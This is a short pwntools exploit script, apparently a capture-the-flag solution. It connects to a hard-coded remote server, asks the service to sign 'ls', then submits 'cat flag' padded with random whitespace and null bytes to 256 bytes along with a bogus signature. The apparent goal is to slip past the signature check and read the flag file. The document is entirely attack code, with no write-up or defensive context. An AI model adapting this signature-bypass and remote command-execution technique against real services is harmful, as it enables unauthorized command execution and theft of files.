from pwn import *
import random

#r=process(["ltrace", "./sss"])
r=remote("54.202.7.144", 9875)
print r.recvuntil(">_")
print r.recv()

def send(what):
    print ">>",repr(what)
    r.send(what)
    sleep(0.2)
    try:
        print r.recv(timeout=4)
    except:
        pass

def sign(what):
    send("1\n")
    send(what)

def run(what, signature):
    send("2\n")
    send(what)
    send(signature+"\n")

sign("ls\n")
cmd="cat flag"
for i in range(30):
    if random.randint(0, 1)==0:
        cmd+=" "
    else:
        cmd+="\t"
cmd=cmd+(256-len(cmd))*"\x00"
run(cmd, "a")
